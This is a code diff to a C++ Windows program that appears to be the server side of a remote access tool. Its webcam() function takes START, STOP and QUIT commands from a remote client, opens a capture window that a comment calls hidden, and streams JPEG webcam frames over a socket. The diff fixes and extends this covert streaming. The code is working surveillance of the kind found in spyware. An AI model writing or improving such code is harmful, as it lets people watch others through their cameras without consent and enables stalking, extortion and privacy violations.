@@ -451,34 +451,40 @@ int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
 void webcam() {
     string cmd;
     bool streaming = false;
-    
+
     while (true) {
         receiveSignal(cmd);
-        
+
         if (cmd == "START") {
             if (!streaming) {
                 streaming = true;
                 sendLine("OK");
-                
-                // Start streaming thread
+
                 thread streamThread([&]() {
-                    const char* windowName = "Webcam";
-                    hCapture = capCreateCaptureWindowA(windowName, 0, 0, 0, 640, 480, NULL, 0);
-                    
+                    // Create hidden capture window
+                    hCapture = capCreateCaptureWindowA("WebcamCap",
+                                                       WS_POPUP, 0, 0, 640, 480,
+                                                       NULL, 0);
                     if (!hCapture) {
                         streaming = false;
+                        sendLine("STOPPED");
                         return;
                     }
-                    
+
                     if (!SendMessage(hCapture, WM_CAP_DRIVER_CONNECT, 0, 0)) {
                         DestroyWindow(hCapture);
                         hCapture = NULL;
                         streaming = false;
+                        sendLine("STOPPED");
                         return;
                     }
-                    
-                    // Set format
-                    BITMAPINFO bmpInfo;
+
+                    // Configure preview to “activate” the driver pipeline
+                    SendMessage(hCapture, WM_CAP_SET_PREVIEWRATE, 33, 0); // ~30 FPS
+                    SendMessage(hCapture, WM_CAP_SET_PREVIEW, TRUE, 0);
+
+                    // Set desired format 640x480 RGB24
+                    BITMAPINFO bmpInfo = {};
                     bmpInfo.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
                     bmpInfo.bmiHeader.biWidth = 640;
                     bmpInfo.bmiHeader.biHeight = 480;
@@ -486,145 +492,127 @@ void webcam() {
                     bmpInfo.bmiHeader.biBitCount = 24;
                     bmpInfo.bmiHeader.biCompression = BI_RGB;
                     SendMessage(hCapture, WM_CAP_SET_VIDEOFORMAT, sizeof(BITMAPINFO), (LPARAM)&bmpInfo);
-                    
-                    // GDI+ initialization for this thread
+
+                    // Init GDI+ in this thread
                     GdiplusStartupInput gdiplusStartupInput;
                     ULONG_PTR gdiplusToken;
                     GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
-                    
-                    // Get JPEG encoder
+
                     CLSID jpegClsid;
                     GetEncoderClsid(L"image/jpeg", &jpegClsid);
-                    
-                    // Set JPEG quality
+
                     EncoderParameters encoderParams;
                     encoderParams.Count = 1;
                     encoderParams.Parameter[0].Guid = EncoderQuality;
                     encoderParams.Parameter[0].Type = EncoderParameterValueTypeLong;
                     encoderParams.Parameter[0].NumberOfValues = 1;
-                    ULONG quality = 75; // Balance between quality and size
+                    ULONG quality = 75;
                     encoderParams.Parameter[0].Value = &quality;
-                    
-                    // Stream frames at 30 FPS
+
                     const int targetFPS = 30;
                     const auto frameDuration = chrono::milliseconds(1000 / targetFPS);
-                    
+
                     while (streaming) {
                         auto frameStart = chrono::high_resolution_clock::now();
-                        
-                        // Capture frame to memory
-                        HDC hdc = GetDC(hCapture);
-                        HDC hdcMem = CreateCompatibleDC(hdc);
-                        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, 640, 480);
-                        SelectObject(hdcMem, hBitmap);
-                        
-                        // Capture from webcam window
-                        SendMessage(hCapture, WM_CAP_GRAB_FRAME_NOSTOP, 0, 0);
-                        SendMessage(hCapture, WM_CAP_EDIT_COPY, 0, 0);
-                        
-                        // Get clipboard data
+
+                        // Ask driver to grab current frame and place a DIB in the clipboard
+                        if (!SendMessage(hCapture, WM_CAP_GRAB_FRAME_NOSTOP, 0, 0)) {
+                            // Failed to grab; small wait
+                            this_thread::sleep_for(chrono::milliseconds(5));
+                            continue;
+                        }
+                        if (!SendMessage(hCapture, WM_CAP_EDIT_COPY, 0, 0)) {
+                            this_thread::sleep_for(chrono::milliseconds(5));
+                            continue;
+                        }
+
+                        // Fetch HBITMAP from clipboard and encode
                         if (OpenClipboard(NULL)) {
                             HBITMAP hClipBitmap = (HBITMAP)GetClipboardData(CF_BITMAP);
                             if (hClipBitmap) {
-                                HDC hdcClip = CreateCompatibleDC(hdc);
-                                SelectObject(hdcClip, hClipBitmap);
-                                BitBlt(hdcMem, 0, 0, 640, 480, hdcClip, 0, 0, SRCCOPY);
-                                DeleteDC(hdcClip);
-                                
-                                // Convert to GDI+ Bitmap
-                                Bitmap* bitmap = new Bitmap(hBitmap, NULL);
-                                
-                                // Save to memory stream (JPEG)
-                                IStream* pStream = NULL;
-                                CreateStreamOnHGlobal(NULL, TRUE, &pStream);
-                                
-                                if (bitmap->Save(pStream, &jpegClsid, &encoderParams) == Ok) {
-                                    // Get size
-                                    STATSTG stats;
-                                    pStream->Stat(&stats, STATFLAG_NONAME);
-                                    ULONG frameSize = stats.cbSize.LowPart;
-                                    
-                                    // Read from stream
-                                    HGLOBAL hMem = NULL;
-                                    GetHGlobalFromStream(pStream, &hMem);
-                                    void* pData = GlobalLock(hMem);
-                                    
-                                    if (pData && frameSize > 0 && frameSize < 500000) { // Safety check
-                                        // Send frame size first
-                                        string sizeStr = to_string(frameSize) + "\n";
-                                        send(clientSocket, sizeStr.c_str(), sizeStr.length(), 0);
-                                        
-                                        // Send frame data
-                                        send(clientSocket, (char*)pData, frameSize, 0);
+                                // Wrap HBITMAP directly as GDI+ Bitmap
+                                Bitmap* bitmap = new Bitmap(hClipBitmap, NULL);
+                                if (bitmap && bitmap->GetLastStatus() == Ok) {
+                                    IStream* pStream = NULL;
+                                    CreateStreamOnHGlobal(NULL, TRUE, &pStream);
+
+                                    if (bitmap->Save(pStream, &jpegClsid, &encoderParams) == Ok) {
+                                        STATSTG stats;
+                                        pStream->Stat(&stats, STATFLAG_NONAME);
+                                        ULONG frameSize = stats.cbSize.LowPart;
+
+                                        HGLOBAL hMem = NULL;
+                                        GetHGlobalFromStream(pStream, &hMem);
+                                        void* pData = GlobalLock(hMem);
+
+                                        if (pData && frameSize > 0 && frameSize < 2 * 1024 * 1024) {
+                                            // Send ASCII size + newline, then raw JPEG data
+                                            string sizeStr = to_string(frameSize) + "\n";
+                                            send(clientSocket, sizeStr.c_str(), (int)sizeStr.length(), 0);
+                                            send(clientSocket, (char*)pData, (int)frameSize, 0);
+                                        }
+                                        GlobalUnlock(hMem);
                                     }
-                                    
-                                    GlobalUnlock(hMem);
+                                    pStream->Release();
+                                    delete bitmap;
                                 }
-                                
-                                pStream->Release();
-                                delete bitmap;
                             }
                             CloseClipboard();
                         }
-                        
-                        DeleteObject(hBitmap);
-                        DeleteDC(hdcMem);
-                        ReleaseDC(hCapture, hdc);
-                        
-                        // Maintain frame rate
+
+                        // Maintain target FPS
                         auto frameEnd = chrono::high_resolution_clock::now();
                         auto elapsed = chrono::duration_cast<chrono::milliseconds>(frameEnd - frameStart);
                         if (elapsed < frameDuration) {
                             this_thread::sleep_for(frameDuration - elapsed);
                         }
                     }
-                    
+
                     // Cleanup
+                    SendMessage(hCapture, WM_CAP_SET_PREVIEW, FALSE, 0);
                     if (hCapture) {
                         SendMessage(hCapture, WM_CAP_DRIVER_DISCONNECT, 0, 0);
                         DestroyWindow(hCapture);
                         hCapture = NULL;
                     }
-                    
                     GdiplusShutdown(gdiplusToken);
                 });
                 streamThread.detach();
-                
+
             } else {
                 sendLine("ERROR: Already streaming");
             }
-            
+
         } else if (cmd == "STOP") {
             if (streaming) {
                 streaming = false;
-                
-                // Wait a bit for thread to cleanup
                 Sleep(200);
-                
                 if (hCapture) {
+                    SendMessage(hCapture, WM_CAP_SET_PREVIEW, FALSE, 0);
                     SendMessage(hCapture, WM_CAP_DRIVER_DISCONNECT, 0, 0);
                     DestroyWindow(hCapture);
                     hCapture = NULL;
                 }
-                
                 sendLine("STOPPED");
             } else {
                 sendLine("ERROR: Not streaming");
             }
-            
+
         } else if (cmd == "QUIT") {
-            if (streaming && hCapture) {
+            if (streaming) {
                 streaming = false;
                 Sleep(200);
-                SendMessage(hCapture, WM_CAP_DRIVER_DISCONNECT, 0, 0);
-                DestroyWindow(hCapture);
-                hCapture = NULL;
+                if (hCapture) {
+                    SendMessage(hCapture, WM_CAP_SET_PREVIEW, FALSE, 0);
+                    SendMessage(hCapture, WM_CAP_DRIVER_DISCONNECT, 0, 0);
+                    DestroyWindow(hCapture);
+                    hCapture = NULL;
+                }
             }
             return;
         }
     }
 }
-
 // Main Server Function
 int main() {
     WSADATA wsaData;
